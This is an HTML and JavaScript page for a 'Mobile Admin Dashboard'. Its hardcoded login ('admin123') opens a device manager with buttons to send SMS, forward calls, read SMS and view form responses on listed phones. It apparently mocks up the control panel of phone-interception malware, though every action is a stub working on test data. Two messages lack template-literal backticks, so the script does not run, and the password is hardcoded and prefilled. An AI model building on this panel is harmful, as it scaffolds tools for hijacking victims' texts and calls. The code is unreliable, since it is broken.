<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Admin Dashboard</title>
    <style>
        /* Simple CSS */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial; }
        body { background: #f0f2f5; padding: 20px; }
        .login-box { 
            background: white; 
            padding: 30px; 
            border-radius: 10px; 
            max-width: 400px; 
            margin: 50px auto; 
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        input { 
            width: 100%; 
            padding: 12px; 
            margin: 10px 0; 
            border: 2px solid #ddd; 
            border-radius: 5px; 
            font-size: 16px;
        }
        button { 
            width: 100%; 
            padding: 12px; 
            background: #007bff; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            font-size: 16px; 
            cursor: pointer;
            margin-top: 10px;
        }
        .dashboard { display: none; }
        .header { 
            background: white; 
            padding: 20px; 
            border-radius: 10px; 
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .device-card {
            background: white;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #007bff;
        }
        .action-btn {
            padding: 8px 12px;
            margin: 5px 3px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-sms { background: #dbeafe; color: #1e40af; }
        .btn-call { background: #d1fae5; color: #065f46; }
        .btn-view { background: #fef3c7; color: #92400e; }
        .btn-forms { background: #f3e8ff; color: #5b21b6; }
        .btn-delete { background: #fee2e2; color: #991b1b; }
        .btn-logout { background: #6c757d; color: white; }
        .online { color: green; font-weight: bold; }
        .offline { color: red; font-weight: bold; }
    </style>
</head>
<body>

<!-- LOGIN SCREEN -->
<div id="loginDiv">
    <div class="login-box">
        <h2>üîê Admin Login</h2>
        <p>Enter password to access dashboard</p>
        <input type="password" id="password" placeholder="Password" value="admin123">
        <button onclick="login()">LOGIN TO DASHBOARD</button>
        <p style="color:#666; margin-top:15px; font-size:14px;">
            Default password: <strong>admin123</strong>
        </p>
    </div>
</div>

<!-- DASHBOARD -->
<div id="dashboardDiv" class="dashboard">
    <div class="header">
        <div>
            <h2>üì± Device Manager</h2>
            <p id="deviceCount">0 devices connected</p>
        </div>
        <button onclick="logout()" class="action-btn btn-logout">Logout</button>
    </div>

    <div id="devicesContainer">
        <!-- Devices will appear here -->
    </div>
</div>

<script>
// ================= SIMPLE LOGIN =================
function login() {
    console.log("Login button clicked");
    
    const password = document.getElementById('password').value;
    
    if (password === "admin123") {
        // Hide login, show dashboard
        document.getElementById('loginDiv').style.display = 'none';
        document.getElementById('dashboardDiv').style.display = 'block';
        
        // Load devices
        loadDevices();
        
        // Show success message
        showMessage("‚úÖ Login successful!", "success");
    } else {
        alert("‚ùå Wrong password! Try: admin123");
        document.getElementById('password').style.borderColor = "red";
        setTimeout(() => {
            document.getElementById('password').style.borderColor = "#ddd";
        }, 1000);
    }
}

// ================= LOAD DEVICES =================
function loadDevices() {
    // Test devices data
    const devices = [
        {
            id: 1,
            name: "Samsung Galaxy S21",
            online: true,
            sim1: "+91 98765 43210",
            sim2: "+91 98765 43211",
            battery: 85,
            model: "Galaxy S21"
        },
        {
            id: 2,
            name: "OnePlus 9R",
            online: false,
            sim1: "+91 98765 43212",
            sim2: "Not available",
            battery: 45,
            model: "OnePlus 9R"
        },
        {
            id: 3,
            name: "iPhone 13 Pro",
            online: true,
            sim1: "+91 98765 43213",
            sim2: "+91 98765 43214",
            battery: 92,
            model: "iPhone 13"
        }
    ];
    
    // Update device count
    document.getElementById('deviceCount').textContent = 
        devices.length + " devices connected";
    
    // Display devices
    displayDevices(devices);
}

// ================= DISPLAY DEVICES =================
function displayDevices(devices) {
    const container = document.getElementById('devicesContainer');
    
    let html = '';
    
    devices.forEach(device => {
        const statusClass = device.online ? 'online' : 'offline';
        const statusText = device.online ? 'üü¢ Online' : 'üî¥ Offline';
        
        html += `
            <div class="device-card">
                <div style="display: flex; justify-content: space-between; align-items: flex-start;">
                    <div>
                        <h3>${device.name}</h3>
                        <p>
                            <span class="${statusClass}">${statusText}</span>
                            <span style="margin: 0 10px;">|</span>
                            <span>üîã ${device.battery}%</span>
                        </p>
                    </div>
                    <button onclick="deleteDevice(${device.id})" class="action-btn btn-delete">
                        Delete
                    </button>
                </div>
                
                <div style="margin: 10px 0;">
                    <p><strong>üì± SIM 1:</strong> ${device.sim1}</p>
                    <p><strong>üì± SIM 2:</strong> ${device.sim2}</p>
                    <p><strong>üì± Model:</strong> ${device.model}</p>
                </div>
                
                <div>
                    <button onclick="sendSMS(${device.id})" class="action-btn btn-sms">
                        Send SMS
                    </button>
                    <button onclick="callForward(${device.id})" class="action-btn btn-call">
                        Call Forward
                    </button>
                    <button onclick="viewSMS(${device.id})" class="action-btn btn-view">
                        View SMS
                    </button>
                    <button onclick="viewForms(${device.id})" class="action-btn btn-forms">
                        Form Responses
                    </button>
                </div>
            </div>
        `;
    });
    
    container.innerHTML = html;
}

// ================= ACTION FUNCTIONS =================
function sendSMS(deviceId) {
    const number = prompt("Enter phone number:");
    const message = prompt("Enter message:");
    if (number && message) {
        showMessage(SMS sent to ${number}, "success");
    }
}

function callForward(deviceId) {
    const action = prompt("1. Activate\n2. Deactivate\n3. Check Status\n\nEnter choice (1/2/3):");
    if (action === "1") {
        const number = prompt("Enter forwarding number:");
        showMessage(Call forwarding activated to ${number}, "success");
    } else if (action === "2") {
        showMessage("Call forwarding deactivated", "success");
    } else if (action === "3") {
        showMessage("Status: Active", "info");
    }
}

function viewSMS(deviceId) {
    showMessage("SMS History loaded", "success");
    // In real app, fetch from database
}

function viewForms(deviceId) {
    showMessage("Form responses loaded", "success");
    // In real app, fetch from database
}

function deleteDevice(deviceId) {
    if (confirm("Delete this device?")) {
        showMessage("Device deleted", "success");
        loadDevices(); // Reload
    }
}

function logout() {
    document.getElementById('dashboardDiv').style.display = 'none';
    document.getElementById('loginDiv').style.display = 'block';
    document.getElementById('password').value = 'admin123';
    showMessage("Logged out successfully", "info");
}

// ================= HELPER FUNCTIONS =================
function showMessage(text, type) {
    // Create message element
    const messageDiv = document.createElement('div');
    messageDiv.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        background: ${type === 'success' ? '#28a745' : 
                     type === 'error' ? '#dc3545' : '#17a2b8'};
        color: white;
        border-radius: 5px;
        z-index: 1000;
        box-shadow: 0 3px 10px rgba(0,0,0,0.2);
    `;
    messageDiv.innerHTML = text;
    
    document.body.appendChild(messageDiv);
    
    // Remove after 3 seconds
    setTimeout(() => {
        messageDiv.remove();
    }, 3000);
}

// ================= AUTO LOGIN CHECK =================
window.onload = function() {
    console.log("Dashboard loaded");
    // Check if already logged in (for future)
    if (localStorage.getItem('admin_logged_in') === 'true') {
        document.getElementById('loginDiv').style.display = 'none';
        document.getElementById('dashboardDiv').style.display = 'block';
        loadDevices();
    }
};
</script>

</body>
</html>
